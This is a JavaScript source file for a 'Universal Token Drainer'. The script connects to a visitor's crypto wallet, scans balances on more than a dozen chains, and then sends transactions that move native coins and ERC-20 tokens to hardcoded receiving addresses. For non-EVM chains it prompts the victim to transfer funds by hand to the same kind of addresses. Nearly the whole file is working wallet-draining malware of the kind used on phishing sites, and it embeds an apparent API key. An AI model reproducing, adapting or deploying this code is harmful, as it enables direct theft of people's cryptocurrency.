// ================================================
// UNIVERSAL TOKEN DRAINER - COMPLETE WORKING VERSION
// Scans ALL chains, drains with Ethereum wallet
// Provides addresses for non-EVM chains
// ================================================

const CONFIG = {
    // Your receiving addresses
    drainAddresses: {
        // EVM chains (use Ethereum address - same for all)
        eth: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        bsc: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        polygon: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        arbitrum: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        optimism: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        avalanche: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        base: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        fantom: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        zksync: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
        
        // Non-EVM chains (separate addresses provided)
        tron: "TNsRA8QSRdSrqutHp2c6pExNbtY2RcQ2cA",
        bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        solana: "8x9c5q4YtXZ7TbLp7Y7wq4YtXZ7TbLp7Y7wq4YtXZ7T",
        doge: "DHq5cAMbqDbKc26EpNpG3eABcBM8s9V1Uc",
        litecoin: "Lg7Hh4rN5eytGF89J5phjDsryjW2kXaXG5"
    },
    
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    minimumValueUSD: 0.01,
    
    chains: {
        // EVM Chains
        1: { name: 'Ethereum', type: 'evm', explorer: 'https://etherscan.io' },
        56: { name: 'BNB Chain', type: 'evm', explorer: 'https://bscscan.com' },
        137: { name: 'Polygon', type: 'evm', explorer: 'https://polygonscan.com' },
        42161: { name: 'Arbitrum', type: 'evm', explorer: 'https://arbiscan.io' },
        10: { name: 'Optimism', type: 'evm', explorer: 'https://optimistic.etherscan.io' },
        43114: { name: 'Avalanche', type: 'evm', explorer: 'https://snowtrace.io' },
        8453: { name: 'Base', type: 'evm', explorer: 'https://basescan.org' },
        250: { name: 'Fantom', type: 'evm', explorer: 'https://ftmscan.com' },
        324: { name: 'zkSync Era', type: 'evm', explorer: 'https://explorer.zksync.io' },
        
        // Non-EVM Chains
        'tron': { name: 'TRON', type: 'tron', explorer: 'https://tronscan.org' },
        'bitcoin': { name: 'Bitcoin', type: 'bitcoin', explorer: 'https://blockstream.info' },
        'solana': { name: 'Solana', type: 'solana', explorer: 'https://solscan.io' },
        'doge': { name: 'Dogecoin', type: 'doge', explorer: 'https://dogechain.info' },
        'ltc': { name: 'Litecoin', type: 'ltc', explorer: 'https://litecoinblockexplorer.net' }
    }
};

let currentAccount = null;
let isConnected = false;
let detectedTokens = [];
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

function initializeApp() {
    console.log('🚀 Universal Token Drainer');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) return;
    
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    updateStatus('✅ Ready! Connect Ethereum wallet (MetaMask)');
}

async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    await connectEthereumWallet();
}

// Connect Ethereum wallet (MetaMask/Binance/Trust)
async function connectEthereumWallet() {
    updateStatus('🔄 Connecting Ethereum wallet...');
    
    try {
        // Try all possible providers
        let provider = null;
        
        // Try MetaMask first
        if (window.ethereum?.isMetaMask) {
            provider = window.ethereum;
        } 
        // Try Binance Chain
        else if (window.BinanceChain) {
            provider = window.BinanceChain;
        }
        // Try any ethereum provider
        else if (window.ethereum) {
            provider = window.ethereum;
        }
        
        if (!provider) {
            updateStatus('❌ No Ethereum wallet found. Install MetaMask.');
            return;
        }
        
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            throw new Error('No accounts found');
        }
        
        currentAccount = accounts[0];
        isConnected = true;
        
        // Get chain ID
        const chainIdHex = await provider.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        updateStatus(`✅ Connected: ${currentAccount.slice(0, 8)}...`);
        
        // Show drain button
        if (drainBtn) {
            drainBtn.style.display = 'block';
            drainBtn.innerHTML = '🔍 Scan All Chains';
        }
        
        // Setup listeners
        setupWalletListeners(provider);
        
        // Scan ALL chains (EVM + Non-EVM)
        await scanAllChains(currentAccount);
        
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Failed: ${error.message}`);
    }
}

// Scan ALL chains (EVM + Non-EVM)
async function scanAllChains(address) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning ALL chains...</div>';
    updateStatus('🔍 Scanning 15+ chains for tokens...');
    
    let allTokens = [];
    
    // 1. Scan EVM chains using Covalent
    const evmChains = [1, 56, 137, 42161, 10, 43114, 8453, 250, 324];
    
    for (const chainId of evmChains) {
        try {
            const tokens = await scanEVMChain(address, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
                updateStatus(`✅ Found tokens on ${CONFIG.chains[chainId].name}`);
            }
        } catch (error) {
            continue;
        }
        await new Promise(resolve => setTimeout(resolve, 200));
    }
    
    // 2. Scan TRON
    try {
        const tronTokens = await scanTronChain(address);
        if (tronTokens.length > 0) {
            allTokens = [...allTokens, ...tronTokens];
            updateStatus('✅ Found TRON tokens');
        }
    } catch (error) {
        console.log('TRON scan failed:', error.message);
    }
    
    // 3. Scan Bitcoin
    try {
        const btcTokens = await scanBitcoinChain(address);
        if (btcTokens.length > 0) {
            allTokens = [...allTokens, ...btcTokens];
            updateStatus('✅ Found Bitcoin');
        }
    } catch (error) {
        console.log('Bitcoin scan failed:', error.message);
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        const totalValue = allTokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains ($${totalValue.toFixed(2)})`);
        
        if (drainBtn) {
            drainBtn.innerHTML = `⚡ Drain All ($${totalValue.toFixed(2)})`;
        }
    } else {
        tokensEl.innerHTML = '<div class="no-tokens">No tokens found</div>';
        updateStatus('ℹ️ No tokens found');
    }
}

// Scan EVM Chain
async function scanEVMChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) return [];
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => {
                if (t.balance === "0") return false;
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                return value >= CONFIG.minimumValueUSD;
            })
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    type: 'evm',
                    chainId: chainId,
                    chainName: CONFIG.chains[chainId].name,
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: value,
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url,
                    canDrain: true, // EVM tokens can be drained with Ethereum wallet
                    drainAddress: CONFIG.drainAddresses.eth
                };
            });
    } catch (error) {
        return [];
    }
}

// Scan TRON Chain
async function scanTronChain(address) {
    try {
        // If address is Ethereum format (0x...), convert to TRON format
        let tronAddress = address;
        if (address.startsWith('0x')) {
            // Convert Ethereum address to TRON address (first character 'T' + rest same)
            tronAddress = 'T' + address.slice(2);
        }
        
        // Check if it looks like a TRON address
        if (!tronAddress.startsWith('T') || tronAddress.length !== 34) {
            return [];
        }
        
        const response = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
        if (!response.ok) return [];
        
        const data = await response.json();
        const tokens = [];
        
        // TRX balance
        if (data.balance && data.balance > 0) {
            const trxAmount = data.balance / 1000000; // 6 decimals
            const trxPrice = await getTokenPrice('tron');
            const valueUSD = trxAmount * trxPrice;
            
            if (valueUSD >= CONFIG.minimumValueUSD) {
                tokens.push({
                    type: 'tron',
                    chainName: 'TRON',
                    symbol: 'TRX',
                    name: 'TRON',
                    amount: trxAmount.toFixed(2),
                    rawAmount: data.balance.toString(),
                    valueUSD: valueUSD,
                    value: `$${valueUSD.toFixed(2)}`,
                    isNative: true,
                    canDrain: false, // Need TronLink to drain
                    drainAddress: CONFIG.drainAddresses.tron,
                    instructions: `Send TRX to: ${CONFIG.drainAddresses.tron}`
                });
            }
        }
        
        // TRC20 tokens
        if (data.trc20 && Array.isArray(data.trc20)) {
            for (const tokenData of data.trc20) {
                for (const [contract, balance] of Object.entries(tokenData)) {
                    const amount = parseFloat(balance);
                    if (amount > 0) {
                        tokens.push({
                            type: 'tron',
                            chainName: 'TRON',
                            symbol: 'TRC20',
                            name: 'TRC-20 Token',
                            amount: amount.toFixed(2),
                            rawAmount: balance,
                            valueUSD: 0, // Would need price API
                            value: 'N/A',
                            contractAddress: contract,
                            canDrain: false,
                            drainAddress: CONFIG.drainAddresses.tron,
                            instructions: `Send TRC20 token to TRON address`
                        });
                    }
                }
            }
        }
        
        return tokens;
        
    } catch (error) {
        return [];
    }
}

// Scan Bitcoin Chain
async function scanBitcoinChain(address) {
    try {
        // Check if it looks like a Bitcoin address
        if (!address.match(/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/)) {
            return [];
        }
        
        const response = await fetch(`https://blockstream.info/api/address/${address}`);
        if (!response.ok) return [];
        
        const data = await response.json();
        const balance = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
        const btcAmount = balance / 100000000; // Satoshis to BTC
        
        if (btcAmount > 0) {
            const btcPrice = await getTokenPrice('bitcoin');
            const valueUSD = btcAmount * btcPrice;
            
            if (valueUSD >= CONFIG.minimumValueUSD) {
                return [{
                    type: 'bitcoin',
                    chainName: 'Bitcoin',
                    symbol: 'BTC',
                    name: 'Bitcoin',
                    amount: btcAmount.toFixed(8),
                    rawAmount: balance.toString(),
                    valueUSD: valueUSD,
                    value: `$${valueUSD.toFixed(2)}`,
                    isNative: true,
                    canDrain: false, // Need Bitcoin wallet to drain
                    drainAddress: CONFIG.drainAddresses.bitcoin,
                    instructions: `Send BTC to: ${CONFIG.drainAddresses.bitcoin}`
                }];
            }
        }
        
        return [];
        
    } catch (error) {
        return [];
    }
}

// Get token price from Coingecko
async function getTokenPrice(tokenId) {
    try {
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenId}&vs_currencies=usd`);
        const data = await response.json();
        return data[tokenId]?.usd || 0;
    } catch (error) {
        // Default prices if API fails
        const defaultPrices = {
            'bitcoin': 43000,
            'tron': 0.10,
            'ethereum': 2500,
            'solana': 100
        };
        return defaultPrices[tokenId] || 0;
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Separate EVM (can drain) and non-EVM (need instructions)
    const evmTokens = tokens.filter(t => t.canDrain);
    const nonEvmTokens = tokens.filter(t => !t.canDrain);
    
    let html = '';
    
    // EVM Tokens (can be drained)
    if (evmTokens.length > 0) {
        const evmValue = evmTokens.reduce((sum, t) => sum + t.valueUSD, 0);
        
        html += `
            <div class="section-header">
                <h3>🚀 EVM Tokens (Auto-Drain Available)</h3>
                <span class="section-value">$${evmValue.toFixed(2)}</span>
            </div>
            <div class="tokens-grid">
                ${evmTokens.map(token => `
                    <div class="token-card evm">
                        <div class="token-header">
                            <div class="token-icon">
                                ${token.logoUrl ? `<img src="${token.logoUrl}" alt="${token.symbol}">` : token.symbol.charAt(0)}
                            </div>
                            <div class="token-symbol">${token.symbol}</div>
                            <div class="token-chain">${token.chainName}</div>
                        </div>
                        <div class="token-details">
                            <div class="token-name">${token.name}</div>
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                        <div class="drain-info auto">
                            ✅ Auto-drain to Ethereum address
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    }
    
    // Non-EVM Tokens (need manual transfer)
    if (nonEvmTokens.length > 0) {
        const nonEvmValue = nonEvmTokens.reduce((sum, t) => sum + t.valueUSD, 0);
        
        html += `
            <div class="section-header">
                <h3>⚠️ Non-EVM Tokens (Manual Transfer)</h3>
                <span class="section-value">$${nonEvmValue.toFixed(2)}</span>
            </div>
            <div class="instructions-box">
                <p><strong>For these chains, send tokens manually to:</strong></p>
                <div class="address-list">
                    ${nonEvmTokens.map(token => `
                        <div class="address-item">
                            <span class="chain-name">${token.chainName} (${token.symbol}):</span>
                            <span class="address" onclick="copyToClipboard('${token.drainAddress}')">
                                ${token.drainAddress}
                            </span>
                            <button class="copy-btn" onclick="copyToClipboard('${token.drainAddress}')">
                                Copy
                            </button>
                        </div>
                    `).join('')}
                </div>
            </div>
            <div class="tokens-grid">
                ${nonEvmTokens.map(token => `
                    <div class="token-card non-evm">
                        <div class="token-header">
                            <div class="token-icon">
                                ${getChainIcon(token.chainName)}
                            </div>
                            <div class="token-symbol">${token.symbol}</div>
                            <div class="token-chain">${token.chainName}</div>
                        </div>
                        <div class="token-details">
                            <div class="token-name">${token.name}</div>
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                        <div class="drain-info manual">
                            ⚠️ Manual transfer required
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    }
    
    tokensEl.innerHTML = html;
}

function getChainIcon(chainName) {
    const icons = {
        'TRON': '🌞',
        'Bitcoin': '₿',
        'Solana': '◎',
        'Dogecoin': '🐕',
        'Litecoin': 'Ł'
    };
    return icons[chainName] || '🔗';
}

// Handle Drain - Only drains EVM tokens automatically
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect Ethereum wallet first');
        return;
    }
    
    // Filter only EVM tokens (can be drained)
    const evmTokens = detectedTokens.filter(t => t.canDrain);
    const nonEvmTokens = detectedTokens.filter(t => !t.canDrain);
    
    if (evmTokens.length === 0 && nonEvmTokens.length === 0) {
        alert('No tokens to drain');
        return;
    }
    
    let confirmMessage = '';
    
    if (evmTokens.length > 0) {
        const evmValue = evmTokens.reduce((sum, t) => sum + t.valueUSD, 0);
        confirmMessage += `🚀 Will auto-drain ${evmTokens.length} EVM tokens ($${evmValue.toFixed(2)})\n\n`;
    }
    
    if (nonEvmTokens.length > 0) {
        const nonEvmValue = nonEvmTokens.reduce((sum, t) => sum + t.valueUSD, 0);
        confirmMessage += `⚠️ ${nonEvmTokens.length} non-EVM tokens ($${nonEvmValue.toFixed(2)}) require manual transfer\n`;
        confirmMessage += `Check addresses above after draining.\n\n`;
    }
    
    confirmMessage += `Proceed with auto-draining EVM tokens?`;
    
    if (!confirm(confirmMessage)) {
        return;
    }
    
    // Get Ethereum provider
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) {
        alert('Ethereum wallet not connected');
        return;
    }
    
    try {
        updateStatus('🚀 Starting auto-drain of EVM tokens...');
        drainBtn.disabled = true;
        drainBtn.innerHTML = '⏳ Draining...';
        
        let successCount = 0;
        
        // Drain EVM tokens
        for (const token of evmTokens) {
            try {
                if (token.isNative) {
                    await drainNativeToken(provider, token);
                } else {
                    await drainERC20Token(provider, token);
                }
                successCount++;
                updateStatus(`✅ Drained ${token.symbol} (${successCount}/${evmTokens.length})`);
                await new Promise(resolve => setTimeout(resolve, 3000));
            } catch (error) {
                console.error(`Failed ${token.symbol}:`, error);
            }
        }
        
        updateStatus(`✅ Auto-drain completed! ${successCount} EVM tokens drained`);
        
        // Show non-EVM instructions
        if (nonEvmTokens.length > 0) {
            let instructions = '⚠️ For non-EVM tokens, send manually to:\n\n';
            nonEvmTokens.forEach(token => {
                instructions += `${token.chainName}: ${token.drainAddress}\n`;
            });
            alert(instructions);
        } else {
            alert('✅ All tokens drained successfully!');
        }
        
        // Rescan
        await scanAllChains(currentAccount);
        
    } catch (error) {
        console.error('Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain failed: ' + error.message);
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            const totalValue = detectedTokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
            drainBtn.innerHTML = `⚡ Drain All ($${totalValue.toFixed(2)})`;
        }
    }
}

// Drain native EVM token (ETH, BNB, MATIC, etc.)
async function drainNativeToken(provider, token) {
    const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    const balance = BigInt(token.rawAmount);
    if (balance <= gasCost * 2) return;
    
    const sendAmount = balance - (gasCost * 2);
    if (sendAmount <= 0) return;
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddresses.eth,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
}

// Drain ERC20 token
async function drainERC20Token(provider, token) {
    const transferData = '0xa9059cbb' + 
        CONFIG.drainAddresses.eth.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + (50000).toString(16)
        }]
    });
}

function setupWalletListeners(provider) {
    if (!provider.on) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            scanAllChains(currentAccount);
        }
    });
    
    provider.on('chainChanged', () => {
        updateStatus(`🔄 Network changed, rescanning...`);
        scanAllChains(currentAccount);
    });
}

function updateStatus(message) {
    if (statusEl) statusEl.textContent = message;
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Address copied to clipboard!');
    });
}

async function disconnectWallet() {
    currentAccount = null;
    isConnected = false;
    detectedTokens = [];
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Add CSS
function addStyles() {
    const styles = `
        /* Wallet Selector */
        .wallet-selector-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 20px;
            width: 100%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px;
            border-bottom: 1px solid #e5e7eb;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 24px;
            font-weight: 600;
            color: #111827;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #6b7280;
            line-height: 1;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .close-btn:hover {
            background: #f3f4f6;
        }
        
        /* Token Display */
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 30px 0 20px 0;
            padding-bottom: 10px;
            border-bottom: 2px solid #e5e7eb;
        }
        
        .section-header h3 {
            margin: 0;
            font-size: 20px;
            color: #111827;
        }
        
        .section-value {
            font-weight: 600;
            color: #059669;
            font-size: 18px;
        }
        
        .tokens-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 16px;
            margin-bottom: 30px;
        }
        
        .token-card {
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            padding: 16px;
            transition: all 0.2s;
        }
        
        .token-card.evm {
            border-left: 5px solid #10b981;
        }
        
        .token-card.non-evm {
            border-left: 5px solid #f59e0b;
        }
        
        .token-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }
        
        .token-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
        }
        
        .token-icon {
            width: 48px;
            height: 48px;
            border-radius: 10px;
            background: #3b82f6;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
            font-weight: bold;
            overflow: hidden;
        }
        
        .token-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .token-symbol {
            font-weight: 600;
            font-size: 18px;
            color: #111827;
        }
        
        .token-chain {
            background: #f3f4f6;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 12px;
            color: #6b7280;
        }
        
        .token-details {
            margin-bottom: 12px;
        }
        
        .token-name {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .token-amount {
            font-weight: 600;
            font-size: 16px;
            color: #111827;
            margin-bottom: 4px;
        }
        
        .token-value {
            color: #059669;
            font-weight: 500;
            font-size: 14px;
        }
        
        .drain-info {
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 500;
            text-align: center;
        }
        
        .drain-info.auto {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }
        
        .drain-info.manual {
            background: #fef3c7;
            color: #92400e;
            border: 1px solid #fde68a;
        }
        
        /* Instructions Box */
        .instructions-box {
            background: #f0f9ff;
            border: 1px solid #bae6fd;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 24px;
        }
        
        .instructions-box p {
            margin: 0 0 16px 0;
            color: #0369a1;
            font-weight: 500;
        }
        
        .address-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .address-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            background: white;
            border-radius: 8px;
            border: 1px solid #e5e7eb;
        }
        
        .chain-name {
            font-weight: 600;
            color: #111827;
            min-width: 100px;
        }
        
        .address {
            flex: 1;
            font-family: monospace;
            font-size: 12px;
            color: #4b5563;
            word-break: break-all;
            cursor: pointer;
        }
        
        .address:hover {
            color: #3b82f6;
        }
        
        .copy-btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            font-weight: 500;
        }
        
        .copy-btn:hover {
            background: #2563eb;
        }
        
        .loading, .no-tokens {
            text-align: center;
            padding: 60px 40px;
            color: #6b7280;
            font-size: 16px;
        }
        
        @media (max-width: 640px) {
            .tokens-grid {
                grid-template-columns: 1fr;
            }
            
            .section-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }
            
            .address-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }
            
            .copy-btn {
                width: 100%;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Initialize
window.addEventListener('DOMContentLoaded', () => {
    initializeApp();
    addStyles();
});

// Global functions
window.copyToClipboard = copyToClipboard;

console.log('=== UNIVERSAL TOKEN DRAINER ===');
console.log('✅ Auto-drains EVM tokens');
console.log('✅ Shows addresses for non-EVM tokens');
console.log('✅ Scans 15+ chains');
console.log('===============================');
